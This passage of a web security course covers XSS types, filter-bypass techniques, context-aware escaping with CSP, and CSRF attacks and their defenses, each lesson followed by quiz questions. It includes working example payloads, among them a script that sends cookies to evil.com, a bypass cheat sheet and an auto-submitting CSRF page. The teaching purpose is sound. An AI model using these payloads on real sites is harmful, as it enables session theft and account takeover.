<summary>View Answer &amp; Analysis</summary>\n  <div class=\"answer-content\">\n    <p><strong>Answer:</strong> It rejects any document containing a <code>&lt;!DOCTYPE&gt;</code> declaration immediately, eliminating all possible entity-based attack vectors at their root.</p>\n  </div>\n</details>\n\n<h3>Chapter Summary</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Layer</th><th>Strategy</th></tr>\n  </thead>\n  <tbody>\n    <tr><td><strong>Parser Level</strong></td><td>Disable DTDs and external entity loaders globally</td></tr>\n    <tr><td><strong>Library Level</strong></td><td>Adopt hardened wrappers like Python's <code>defusedxml</code></td></tr>\n    <tr><td><strong>Network Level</strong></td><td>Egress firewall filtering outbound connections from application tiers</td></tr>\n  </tbody>\n</table>\n","checkpoints":[{"question":"In Java DocumentBuilderFactory, which feature configuration permanently neutralizes XXE attacks?","options":["Setting disallow-doctype-decl to true","Enabling debug logging","Installing host antivirus software","Increasing JVM heap memory to 16GB"],"answer":0,"explanation":"Disallowing DOCTYPE declarations rejects all document types containing entity definitions outright."},{"question":"Which Python library is standardly recommended to replace vulnerable built-in XML parsers?","options":["defusedxml","lxml","xml.etree","minidom"],"answer":0,"explanation":"defusedxml provides drop-in replacements that defensively defuse XML entity expansion and external fetches."}]},
  "web-04-01": {"html":"\n<h2>XSS Fundamentals & Three Core Types Compared</h2>\n\n<p><strong>Cross-Site Scripting (XSS)</strong> remains one of the most prevalent vulnerabilities across web applications. Despite the word \"Cross-Site\", its core mechanics are straightforward: <strong>the application fails to properly sanitize or context-encode untrusted user input before displaying it, leading the victim's browser to execute arbitrary attacker-supplied scripts under the security context of the vulnerable site!</strong></p>\n\n<p>Consider an intuitive analogy: A community bulletin board allows residents to pin notes. A legitimate neighbor posts: \"Apartment for rent, contact 555-0199\". But an adversary pins: \"<strong>Attention all residents reading this notice: immediately make a duplicate of your front door key and drop it into mailbox #201!</strong>\" Because web browsers inherently trust all markup and scripts delivered by the site, every visiting user's browser executes the malicious directive immediately—this is Cross-Site Scripting.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the root cause of XSS: blurring boundaries between untrusted data and executable markup<br>\n  ② Master the mechanics and blast radius of the three classic variants: <strong>Reflected</strong>, <strong>Stored</strong>, and <strong>DOM-based</strong> XSS<br>\n  ③ Navigate the reference dictionary of client-side <strong>Sources</strong> and <strong>Sinks</strong> for DOM XSS audits<br>\n  ④ Evaluate real-world impact: session hijacking via cookie theft, credential harvesting, CSRF amplification, and worm replication</p>\n</div>\n\n<h3>Step 1: The Three XSS Types Comparative Cheat Sheet</h3>\n\n<p>Depending on where the payload resides and which component processes it, XSS vulnerabilities are categorized into three distinct classes:</p>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Variant</th><th>Delivery Vector</th><th>Payload Persistence</th><th>Trigger Scenario</th><th>Impact & Propagation</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Reflected</strong></td>\n      <td>URL query string / form submission</td>\n      <td>None (server reflects parameter straight back into HTTP response)</td>\n      <td>Victim clicks an adversary-crafted hyperlink (phishing email, chat message)</td>\n      <td><strong>Medium</strong>: Single execution, requires user interaction/social engineering</td>\n    </tr>\n    <tr>\n      <td><strong>Stored (Persistent)</strong></td>\n      <td>Database records (comments, profile fields, forum posts)</td>\n      <td><strong>Permanently stored in database / backend filesystem</strong></td>\n      <td>Any legitimate user visiting the page automatically triggers the injected payload</td>\n      <td><strong>Critical</strong>: Automated widespread compromise, capable of spawning self-propagating worms</td>\n    </tr>\n    <tr>\n      <td><strong>DOM-based</strong></td>\n      <td>Client-side hash (#), query string, DOM nodes</td>\n      <td>Never touches backend server; parsed solely by client-side JS</td>\n      <td>Victim visits <code>page.html#payload</code>; client script writes untrusted data into DOM</td>\n      <td><strong>High</strong>: Stealthy bypass of server-side WAFs and access logs (hash fragments are not transmitted to servers)</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Minimal Code Anatomy of Each Variant</h3>\n\n<h4>① Reflected XSS</h4>\n<p>Vulnerable backend pattern (e.g. in PHP):</p>\n<div class=\"code-block\">\n<pre><code class=\"language-php\">&lt;?php\n// Flaw: Directly echoing unescaped GET parameter into HTML\n$name = $_GET['name'];\necho \"&lt;h1&gt;Welcome back, \" . $name . \"&lt;/h1&gt;\";\n?&gt;</code></pre>\n</div>\n<p>Attacker delivers phishing link:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-text\">https://bank.com/welcome.php?name=&lt;script&gt;fetch('https://evil.com/log?c=' + document.cookie)&lt;/script&gt;</code></pre>\n</div>\n\n<h4>② Stored XSS</h4>\n<p>Persistent comment feed pattern:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-php\">&lt;?php\n// Step 1: Attacker posts malicious script stored directly into MySQL\n$comment = $_POST['content']; // Payload: &lt;script src=\"https://evil.com/hook.js\"&gt;&lt;/script&gt;\n$db-&gt;query(\"INSERT INTO comments (content) VALUES ('$comment')\");\n\n// Step 2: Every subsequent reader renders the unescaped comment:\n$res = $db-&gt;query(\"SELECT content FROM comments\");\nwhile($row = $res-&gt;fetch()) {\n    echo \"&lt;div class='comment-box'&gt;\" . $row['content'] . \"&lt;/div&gt;\"; // Mass infection!\n}\n?&gt;</code></pre>\n</div>\n\n<h4>③ DOM-based XSS</h4>\n<p>Client-side JavaScript sink exploitation:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-html\">&lt;script&gt;\n// Extracts parameter from URL hash fragment\nlet query = location.hash.substring(1);\n// Dangerous Sink: writing raw string into innerHTML\ndocument.getElementById(\"greeting\").innerHTML = \"Hello, \" + decodeURIComponent(query);\n&lt;/script&gt;</code></pre>\n</div>\n<p>When the victim navigates to <code>https://example.com/page.html#&lt;img src=x onerror=alert(document.cookie)&gt;</code>, the browser evaluates the fragment purely locally, parsing the tag and firing the inline error handler.</p>\n\n<h3>Step 3: DOM XSS Sources and Sinks Reference Dictionary</h3>\n\n<p>Audit client-side JavaScript by tracing data flows from tainted Sources to unescaped Sinks:</p>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Category</th><th>APIs / Properties</th><th>Security Context & Risk</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Common Sources (Taint Inputs)</strong></td>\n      <td>\n        <code>location.search</code>, <code>location.hash</code>, <code>location.href</code><br>\n        <code>document.referrer</code>, <code>document.cookie</code><br>\n        <code>window.name</code>, <code>postMessage (event.data)</code>\n      </td>\n      <td>Inputs directly or indirectly manipulated by arbitrary external callers or adversaries</td>\n    </tr>\n    <tr>\n      <td><strong>HTML Rendering Sinks</strong></td>\n      <td>\n        <code>element.innerHTML</code>, <code>element.outerHTML</code><br>\n        <code>document.write()</code>, <code>document.writeln()</code>\n      </td>\n      <td>Parses raw strings as HTML markup; triggers inline script execution when tags are supplied</td>\n    </tr>\n    <tr>\n      <td><strong>Code Execution Sinks</strong></td>\n      <td>\n        <code>eval()</code>, <code>setTimeout(\"code\", delay)</code><br>\n        <code>setInterval(\"code\", delay)</code>, <code>new Function(\"code\")</code>\n      </td>\n      <td>Dynamically evaluates strings as native JavaScript code; highest severity</td>\n    </tr>\n    <tr>\n      <td><strong>Navigation / Resource Sinks</strong></td>\n      <td>\n        <code>location.href</code>, <code>location.replace()</code><br>\n        <code>iframe.src</code>, <code>script.src</code>\n      </td>\n      <td>Vulnerable to <code>javascript:</code> pseudoprotocol execution or remote script inclusion</td>\n    </tr>\n  </tbody>\n</table>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Exercise 1:</strong> Why are DOM XSS attacks using <code>location.hash</code> invisible in server HTTP access logs? (Hint: Review the RFC HTTP specifications regarding URL fragment identifiers).<br>\n  <strong>Exercise 2:</strong> If a frontend team assigns dynamic text via <code>element.textContent = userInput</code>, does an XSS vulnerability exist? Explain why or why not.</p>\n</div>\n","checkpoints":[{"question":"In DOM-based XSS, which of the following acts as a dangerous execution Sink?","options":["location.hash","document.referrer","element.innerHTML","window.name"],"answer":2,"explanation":"element.innerHTML is a dangerous sink that parses and renders raw markup into the DOM; the others are taint Sources."},{"question":"Why is Stored XSS generally rated with higher severity than Reflected XSS?","options":["Stored XSS only executes inside internal enterprise subnets","Stored XSS is persisted in backend storage, automatically impacting all subsequent visitors without targeted phishing links","Stored XSS executes without relying on a web browser parser","Stored XSS directly wipes the server's file system"],"answer":1,"explanation":"Stored XSS payloads persist in the database, automatically detonating against all users loading the affected page."}]},
  "web-04-02": {"html":"\n<h2>XSS Bypass Techniques & Event Attribute Exploitation</h2>\n\n<p>In real-world penetration testing and security defense operations, developers rarely leave inputs completely unvalidated. Instead, they often deploy rudimentary keyword blacklists (such as stripping <code>&lt;script&gt;</code> tags, removing <code>alert</code>, or scrubbing angle brackets). However, the sheer complexity of HTML specifications ensures that blacklists fail against clever attribute breaking, event handler injection, and multi-tier encoding tricks.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master tag-less execution via <strong>HTML5 Event Handlers</strong> (e.g., <code>onerror</code>, <code>onload</code>, <code>onfocus</code>)<br>\n  ② Break out of attribute quotes and exploit pseudoprotocols (<code>javascript:</code>)<br>\n  ③ Understand multi-layer parsing order across HTML entities, URL schemes, and JavaScript Unicode escapes<br>\n  ④ Apply bypass cheat sheets for environments restricting parentheses, spaces, and specific function names</p>\n</div>\n\n<h3>Step 1: Classic Blacklist Bypass Cheat Sheet</h3>\n\n<p>Match the target filter mechanism against corresponding bypass vectors:</p>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Filtering Mechanism</th><th>Inherent Flaw & Bypass Logic</th><th>Canonical Payload Example</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Stripping <code>&lt;script&gt;</code> tags</strong></td>\n      <td>HTML5 supports dozens of native tags equipped with inline event attributes</td>\n      <td>\n        <code>&lt;img src=x onerror=alert(1)&gt;</code><br>\n        <code>&lt;svg onload=alert(1)&gt;</code><br>\n        <code>&lt;body onload=alert(1)&gt;</code>\n      </td>\n    </tr>\n    <tr>\n      <td><strong>Single-pass string removal (e.g. <code>s/&lt;script&gt;//gi</code>)</strong></td>\n      <td>Non-recursive replacement reconstructs stripped tags from nested strings</td>\n      <td><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code></td>\n    </tr>\n    <tr>\n      <td><strong>Case-sensitive regex</strong></td>\n      <td>HTML tag and attribute parser is completely case-insensitive</td>\n      <td><code>&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</code></td>\n    </tr>\n    <tr>\n      <td><strong>Space character filtering</strong></td>\n      <td>HTML grammar permits slashes <code>/</code>, tabs, or newlines in place of spaces between attributes</td>\n      <td><code>&lt;svg/onload=alert(1)&gt;</code> or <code>&lt;img%09src=x%09onerror=alert(1)&gt;</code></td>\n    </tr>\n    <tr>\n      <td><strong>Restricting parentheses <code>()</code></strong></td>\n      <td>Use ES6 template literal backticks &grave; or exception handling redirects</td>\n      <td><code>&lt;svg onload=alert&grave;1&grave;&gt;</code> or <code>&lt;svg onload=\"window.onerror=eval;throw'=alert\\x281\\x29'\"&gt;</code></td>\n    </tr>\n    <tr>\n      <td><strong>Context is <code>&lt;a href=\"...\"&gt;</code> or <code>&lt;iframe src=\"...\"&gt;</code></strong></td>\n      <td>Browser navigation protocols natively accept <code>javascript:</code> execution schemes</td>\n      <td><code>&lt;a href=\"javascript:alert(document.domain)\"&gt;Claim Reward&lt;/a&gt;</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Attribute Breakout & Zero-Angle-Bracket Execution</h3>\n\n<p>Inputs often reflect directly inside HTML tag attributes rather than between tags, such as in search fields:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-html\">&lt;input type=\"text\" name=\"search\" value=\"&lt;?php echo $_GET['q']; ?&gt;\"&gt;</code></pre>\n</div>\n\n<p><strong>Breakout Mechanics:</strong></p>\n<ol>\n  <li><strong>Full Tag Breakout:</strong> Supply <code>\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br>\n  Result: <code>&lt;input type=\"text\" name=\"search\" value=\"\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;</code>, escaping the element to run standalone scripts.</li>\n  <li><strong>Zero-Angle-Bracket In-Tag Execution:</strong><br>\n  If <code>&lt;</code> and <code>&gt;</code> are completely stripped, you do not need to leave the tag!<br>\n  Supply: <code>\" onfocus=\"alert(1)\" autofocus=\"</code><br>\n  Result: <code>&lt;input type=\"text\" name=\"search\" value=\"\" onfocus=\"alert(1)\" autofocus=\"\"&gt;</code><br>\n  The browser automatically focuses the element on load, instantly firing <code>onfocus</code> without a single angle bracket!</li>\n</ol>\n\n<h3>Step 3: Multi-Layer Encoding & Decoding Order</h3>\n\n<p>Browsers parse tokens across sequential decoding engines: <strong>HTML Parser → JavaScript Parser → URL Parser</strong>. Understanding this hierarchy reveals deep bypass avenues:</p>\n\n<h4>① Automatic HTML Entity Decoding Inside Attribute Values</h4>\n<p>Inside attributes like <code>href</code>, <code>src</code>, or <code>onclick</code>, the HTML parser automatically resolves decimal or hexadecimal entity references before passing the string to the script interpreter:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-html\">&lt;!-- Bypassing WAF string matching via hex entity encoding of javascript: --&gt;\n&lt;a href=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)\"&gt;Click Me&lt;/a&gt;</code></pre>\n</div>\n\n<h4>② Unicode Escape Sequences in JavaScript Contexts</h4>\n<p>Within inline event handlers or script tags, JavaScript engine decodes Unicode escapes for variable and function identifiers:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-javascript\">// alert is interpreted as alert\nalert(document.domain);\n\n// Resolving arbitrary strings dynamically via window object lookup\nwindow['eval'](String.fromCharCode(97,108,101,114,116,40,49,41));</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Hands-on Exercises:</strong><br>\n  ① Given an input reflecting inside <code>&lt;input value=\"USER_INPUT\"&gt;</code> with strict filtering of <code>&lt;</code> and <code>&gt;</code>, construct a payload using <code>onmouseover</code> or <code>autofocus onfocus</code> that successfully executes <code>alert(document.domain)</code>.<br>\n  ② Consider why <code>&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)&lt;/script&gt;</code> fails to execute, while <code>&lt;a href=\"&amp;#x6a;&amp;#x61;...\"&gt;</code> succeeds. (Hint: <code>&lt;script&gt;</code> content is treated as CDATA/raw text by the HTML parser, which suppresses entity decoding).</p>\n</div>\n","checkpoints":[{"question":"If input reflects inside <input value=\"...\"> and angle brackets (< and >) are strictly filtered, how can XSS still be triggered?","options":["Exploitation is impossible without angle brackets","Break out of the attribute quote and inject an event handler like \" onfocus=\"alert(1)\" autofocus=\"","Double-nest angle brackets such as <<>>","Append SQL comment tokens like --+"],"answer":1,"explanation":"Quotation breakout allows appending inline event attributes like autofocus and onfocus without introducing new tag elements."},{"question":"In an <a href=\"...\"> link context without angle brackets, which pseudoprotocol enables direct script execution upon click?","options":["ftp://","file://","javascript:","mailto:"],"answer":2,"explanation":"The javascript: scheme tells the browser to evaluate the succeeding expression as executable code in the current page context."}]},
  "web-04-03": {"html":"\n<h2>Ultimate XSS Defense: Context-Aware Escaping & CSP</h2>\n\n<p>Many engineering teams attempt to resolve XSS by applying a generic blacklist or relying solely on PHP's <code>htmlspecialchars()</code> across all inputs, only to discover their applications remain vulnerable. Robust XSS mitigation demands <strong>Defense-in-Depth</strong>: context-aware output encoding, secure session cookie attributes, and robust Content Security Policies (CSP) enforced directly by modern browsers.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master the core principles of <strong>Context-Aware Output Encoding</strong> across HTML body, attribute, JS variable, and URL contexts<br>\n  ② Understand built-in protections of modern frameworks (React / Vue / Angular) and caveats around <code>v-html</code> / <code>dangerouslySetInnerHTML</code><br>\n  ③ Enforce session security via mandatory Cookie attributes: <strong>HttpOnly, Secure, and SameSite</strong><br>\n  ④ Construct enterprise-grade <strong>Content Security Policy (CSP)</strong> headers using cryptographic Nonces</p>\n</div>\n\n<h3>Step 1: Context-Aware Encoding Cheat Sheet</h3>\n\n<p>Escaping <code>&lt;</code> and <code>&gt;</code> alone is insufficient when data reflects inside quotes, script tags, or hyperlink targets. Apply context-specific rules:</p>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Output Context</th><th>Code Pattern</th><th>Required Sanitization / Escaping Rules</th><th>Pitfalls & Prohibitions</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>HTML Body</strong></td>\n      <td><code>&lt;div&gt;{{ userInput }}&lt;/div&gt;</code></td>\n      <td>\n        <code>&amp;</code> → <code>&amp;amp;</code><br>\n        <code>&lt;</code> → <code>&amp;lt;</code><br>\n        <code>&gt;</code> → <code>&amp;gt;</code>\n      </td>\n      <td>Never concatenate untrusted rich text directly. Always sanitize with DOMPurify against strict tag/attribute allowlists.</td>\n    </tr>\n    <tr>\n      <td><strong>HTML Attribute</strong></td>\n      <td><code>&lt;input value=\"{{ userInput }}\"&gt;</code></td>\n      <td>\n        In addition to angle brackets, escape all quotes:<br>\n        <code>\"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#x27;</code>\n      </td>\n      <td>Always enclose attribute values in double or single quotes. Unquoted attributes allow trivial space-separated injection.</td>\n    </tr>\n    <tr>\n      <td><strong>JavaScript Variable</strong></td>\n      <td><code>&lt;script&gt;var val = \"{{ userInput }}\";&lt;/script&gt;</code></td>\n      <td>\n        <strong>Do not rely on HTML escaping alone!</strong> Use secure JSON serialization:<br>\n        <code>json_encode($val, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP)</code>\n      </td>\n      <td>Escaping special characters into Unicode entities (e.g. <code>\\u003C</code>) prevents premature tag closure via <code>&lt;/script&gt;</code>.</td>\n    </tr>\n    <tr>\n      <td><strong>URL Attributes</strong></td>\n      <td><code>&lt;a href=\"{{ userInput }}\"&gt;</code></td>\n      <td>\n        1. Protocol allowlist check: restrict strictly to <code>http:</code> or <code>https:</code><br>\n        2. Encode query parameters via <code>encodeURIComponent()</code>\n      </td>\n      <td><strong>Critical Warning:</strong> <code>htmlspecialchars()</code> does NOT neutralize <code>javascript:alert(1)</code> execution!</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Securing Session State with Cookie Flags</h3>\n\n<p>The most immediate and damaging payoff in an XSS compromise is stealing <code>document.cookie</code> to hijack active sessions. Configuring browser-enforced cookie security provides an immutable hardware barrier:</p>\n\n<div class=\"code-block\">\n<pre><code class=\"language-http\">Set-Cookie: session_token=v9x2b38k41; Path=/; Secure; HttpOnly; SameSite=Lax</code></pre>\n</div>\n\n<ul>\n  <li><strong><code>HttpOnly</code> (Crucial):</strong> Prevents client-side scripts from accessing the cookie via <code>document.cookie</code>. Even if XSS executes, the session token cannot be read or exfiltrated via script.</li>\n  <li><strong><code>Secure</code>:</strong> Ensures the cookie is only transmitted across TLS/HTTPS encrypted connections, eliminating plaintext MITM interception.</li>\n  <li><strong><code>SameSite=Lax/Strict</code>:</strong> Restricts cookies from being sent with cross-site requests, mitigating most CSRF attack vectors.</li>\n</ul>\n\n<h3>Step 3: Content Security Policy (CSP) Enforcing Zero Inline Execution</h3>\n\n<p><strong>CSP</strong> delivers browser-level sandboxing that restricts where resources can load from and disables dangerous dynamic execution:</p>\n\n<div class=\"code-block\">\n<pre><code class=\"language-http\">Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'self';</code></pre>\n</div>\n\n<h4>Key CSP Directives Reference:</h4>\n<ul>\n  <li><strong><code>default-src 'self'</code>:</strong> Limits origins for images, styles, and fonts strictly to the application's own origin by default.</li>\n  <li><strong><code>script-src 'self' 'nonce-RANDOM'</code>:</strong> Rejects all inline <code>&lt;script&gt;</code> blocks, inline event handlers (such as <code>onerror</code>), and <code>eval()</code> calls unless they present the matching cryptographic one-time nonce generated by the server.</li>\n  <li><strong><code>object-src 'none'</code>:</strong> Neutralizes outdated plugins (Flash, Java Applets).</li>\n  <li><strong><code>base-uri 'self'</code>:</strong> Prevents malicious injection of <code>&lt;base href&gt;</code> tags that hijack relative script URLs.</li>\n</ul>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Input Validation:</strong> Constrain incoming formats using strict regular expressions or strong typing.<br>\n  ② <strong>Context Encoding:</strong> Tailor output encodings to the exact syntactic context (HTML body, attributes, JavaScript literals, URLs).<br>\n  ③ <strong>Defense-in-Depth:</strong> Combine <code>HttpOnly</code> session cookies with strict nonce-based <code>CSP</code> to disarm any payloads that slip through.</p>\n</div>\n","checkpoints":[{"question":"Which cookie security attribute is most essential for preventing Session token theft via XSS?","options":["Domain","Path","HttpOnly","Max-Age"],"answer":2,"explanation":"The HttpOnly flag forbids client-side JavaScript from reading the cookie through document.cookie, neutralizing token exfiltration."},{"question":"In Content-Security-Policy (CSP), which directive setup effectively blocks unauthorized inline script execution?","options":["script-src 'unsafe-inline'","script-src 'self' 'nonce-RANDOM_TOKEN'","default-src *","img-src 'self'"],"answer":1,"explanation":"A nonce-based script-src policy instructs the browser to execute only scripts bearing the cryptographically random nonce generated per request."}]},
  "web-05-01": {"html":"\n<h2>CSRF Fundamentals & Automated PoC Generation</h2>\n\n<p><strong>Cross-Site Request Forgery (CSRF)</strong> represents one of the classic web session vulnerabilities. Attackers exploit the browser's automatic credential transmission mechanism: <strong>when a user is logged into a vulnerable site, an external attacker-controlled page coerces the victim's browser into submitting unauthorized transactions or profile updates on their behalf!</strong></p>\n\n<p>Consider an intuitive real-world analogy: You visit your bank, verify your identity, and hold an active VIP transaction badge (the session cookie). While relaxing in the lobby, a stranger hands you a deposit slip saying, \"Please hand this to the teller\". You hand the slip along with your VIP badge to the teller. The teller sees your valid badge and executes the transfer without knowing that the transfer directive originated from an attacker. That is CSRF!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the core vulnerability mechanism: Ambient Authority and request intent divergence<br>\n  ② Compare GET-based vs. POST-based CSRF exploit vectors<br>\n  ③ Author automated zero-click HTML/JavaScript CSRF PoC templates<br>\n  ④ Master the 3 prerequisites of CSRF: sensitive operation, ambient cookie trust, and predictable parameters</p>\n</div>\n\n<h3>Step 1: CSRF Delivery Vectors Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Request Type</th><th>Delivery Mechanism</th><th>Stealth & Execution Profile</th><th>Common Vulnerable Scenarios</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>GET-Based CSRF</strong></td>\n      <td><code>&lt;img src=\"http://bank.com/transfer?to=hacker&amp;amt=1000\"&gt;</code></td>\n      <td><strong>Extreme Stealth</strong>: Detonates automatically upon image tag loading; zero user interaction required</td>\n      <td>Improper use of GET requests for state-changing operations (transfers, delete account, add friend)</td>\n    </tr>\n    <tr>\n      <td><strong>POST-Based CSRF</strong></td>\n      <td>Hidden <code>&lt;form&gt;</code> hosted on external domain submitted via JavaScript</td>\n      <td><strong>High Stealth</strong>: Submits seamlessly in background tabs or hidden iframes within milliseconds</td>\n      <td>Updating recovery emails, resetting administrative credentials, changing shipping addresses</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Canonical Zero-Click POST CSRF Exploit Template</h3>\n\n<p>Adversaries host this exploit on an external attacker domain and lure the authenticated victim to visit it:</p>\n\n<div class=\"code-block\">\n<pre><code class=\"language-html\">&lt;!-- Hosted on evil.com/claim-prize.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n  &lt;h3&gt;Loading promotional giveaway...&lt;/h3&gt;\n  &lt;!-- Pre-populated cross-origin state-changing form --&gt;\n  &lt;form id=\"csrfForm\" action=\"http://target.com/api/user/change_email\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"new_email\" value=\"attacker@evil.com\" /&gt;\n  &lt;/form&gt;\n\n  &lt;script&gt;\n    // Automatically submits form instantly upon page load\n    // The browser natively attaches all target.com session cookies!\n    document.getElementById('csrfForm').submit();\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Exploitation Conditions:</strong> Victim must have an active session; endpoint must rely exclusively on cookies for authentication; parameters must be predictable without dynamic secrets.<br>\n  ② <strong>CSRF vs. XSS:</strong> XSS executes arbitrary script on the victim site and can exfiltrate responses. CSRF originates from a third-party site and can only submit blindly without reading the server response due to Same-Origin Policy (SOP).</p>\n</div>\n","checkpoints":[{"question":"What is the underlying browser mechanism that makes CSRF attacks possible?","options":["The attacker successfully cracks the user's password","Browsers automatically attach valid session cookies to cross-site requests targeting the origin","The target server fails to deploy HTTPS","A keylogger is installed on the victim's workstation"],"answer":1,"explanation":"Ambient Authority forces browsers to transmit authenticated cookies with cross-site requests, preventing servers from distinguishing genuine user actions."},{"question":"Under the Same-Origin Policy (SOP), can an adversary hosting a CSRF exploit on a third-party domain read the sensitive response body returned by the target server?","options":["Yes, all HTTP requests permit cross-origin response reading","No, SOP blocks cross-origin scripts from inspecting response contents, making CSRF a blind state-changing attack","Only if the request is sent over HTTP instead of HTTPS","Only if the request method is GET"],"answer":1,"explanation":"SOP blocks cross-origin JavaScript from reading response payloads, rendering CSRF a blind action trigger rather than a data-reading exploit."}]},
  "web-05-02": {"html":"\n<h2>Ultimate CSRF Defense: SameSite Cookie & Anti-CSRF Tokens</h2>\n\n<p>A common misconception among beginner developers is that \"converting all API endpoints to POST requests fully mitigates CSRF\". As shown in the previous lesson's automated form submission PoC, POST requests from foreign origins are just as trivial to forge. Defeating CSRF requires architectural defenses that break ambient credential trust.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master modern browser cookie enforcement: <strong>SameSite Cookie Attributes (Strict vs. Lax vs. None)</strong><br>\n  ② Implement the industry-standard <strong>Synchronizer Token Pattern (Anti-CSRF Tokens)</strong><br>\n  ③ Evaluate Double Submit Cookie architectures for stateless API frameworks<br>\n  ④ Leverage custom HTTP headers (e.g. <code>X-CSRF-Token</code>) paired with CORS preflight protection</p>\n</div>\n\n<h3>Step 1: SameSite Cookie Policy Reference Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>SameSite Mode</th><th>Cross-Origin Subrequests (POST/Images)</th><th>Top-Level Navigation (Click Link)</th><th>Security Profile & Tradeoffs</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong><code>SameSite=Strict</code></strong></td>\n      <td><strong>Never sent</strong></td>\n      <td><strong>Never sent</strong> (Requires re-login when entering via external links)</td>\n      <td><strong>Maximum Protection</strong>: Fully neutralizes all CSRF variants; ideal for banking and admin portals</td>\n    </tr>\n    <tr>\n      <td><strong><code>SameSite=Lax</code></strong><br>(Modern Browser Default)</td>\n      <td><strong>Never sent</strong> on state-changing POSTs</td>\n      <td><strong>Sent</strong> (Permitted only on safe top-level GET navigations)</td>\n      <td><strong>Optimal Usability/Security</strong>: Blocks cross-site POST attacks out of the box</td>\n    </tr>\n    <tr>\n      <td><strong><code>SameSite=None</code></strong></td>\n      <td>Always sent</td>\n      <td>Always sent</td>\n      <td><strong>Zero Protection</strong>: Mandatory <code>Secure</code> attribute required; reserved for explicit cross-origin widgets</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Synchronizer Token Pattern (Anti-CSRF Tokens)</h3>\n\n<p>The Anti-CSRF Token is a cryptographically strong, unpredictable secret generated per user session. Because cross-origin scripts cannot violate the Same-Origin Policy (SOP) to inspect target DOM contents, external adversaries cannot forge the token value.</p>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># Backend Flask / Django Verification Pattern\n@app.route('/api/transfer', methods=['POST'])\ndef handle_transfer():\n    submitted_token = request.form.get('csrf_token')\n    session_token = session.get('csrf_token')\n\n    if not submitted_token or submitted_token != session_token:\n        abort(403, \"Invalid CSRF Token: Request rejected\")\n\n    process_transfer()</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Critical Thought Exercise:</strong> If an application suffers from an unpatched XSS vulnerability, can Anti-CSRF Tokens still safeguard user accounts?<br>\n  <strong>Analysis:</strong> No. An attacker leveraging XSS runs script in the origin's context, trivially reading the token from the DOM or session headers before dispatching the forged request.</p>\n</div>\n","checkpoints":[{"question":"Modern browsers default unspecified cookies to SameSite=Lax. How does this mode handle cross-origin POST form submissions?","options":["It transmits cookies normally","It withholds cookies, inherently neutralizing most cross-origin POST CSRF vectors","It prompts the user to re-enter credentials via dialog","It clears all browser history"],"answer":1,"explanation":"Under SameSite=Lax, cross-origin state-changing POST requests withhold cookies completely."},{"question":"Why do Anti-CSRF Tokens reliably defend web applications against CSRF?","options":["They apply quantum encryption to the HTTP payload","They are unpredictable secrets that cross-origin adversary scripts cannot read due to Same-Origin Policy (SOP)","They flush the server's session memory","They convert all requests into GET methods"],"answer":1,"explanation":"Cross-origin adversary scripts cannot violate SOP to read the unique token from the DOM, causing forged submissions to be 